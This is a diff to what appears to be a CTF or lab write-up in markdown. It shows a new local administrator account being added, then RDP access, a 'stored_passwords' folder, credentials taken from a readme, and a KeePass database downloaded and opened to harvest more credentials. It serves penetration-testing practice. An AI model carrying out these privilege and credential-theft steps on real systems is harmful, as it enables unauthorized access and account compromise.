@@ -155,3 +155,29 @@ remote-adduser tyler Hacksmarter123 localhost
 ```python
 execute -o net localgroup Administrators tyler /add
 ```
+
+#### RDP into the machine and look for interesting directories or files
+![[Pasted image 20260830205617.png]]
+- After digging around for a bit, we found a directory which is literally called `stored_passowrds` lol lol lolll!!
+
+![[Pasted image 20260830205742.png]]
+- we found a `keepass` file and a readme file
+
+![[Pasted image 20260830210407.png]]
+found some creds inside the `Readme` file
+
+**We can use the following command to download the keepass file :**
+```python
+download C:/stored_passwords/it_passwords.kdbx
+```
+
+### Install keepass
+```python
+sudo apt install keepass2
+```
+
+
+**Open the keepass file with keepass2 with the masterpassword we found from our readme file**
+![[Pasted image 20260830213214.png]]
+we were able to gain access to a bunch of creds within keepass
+
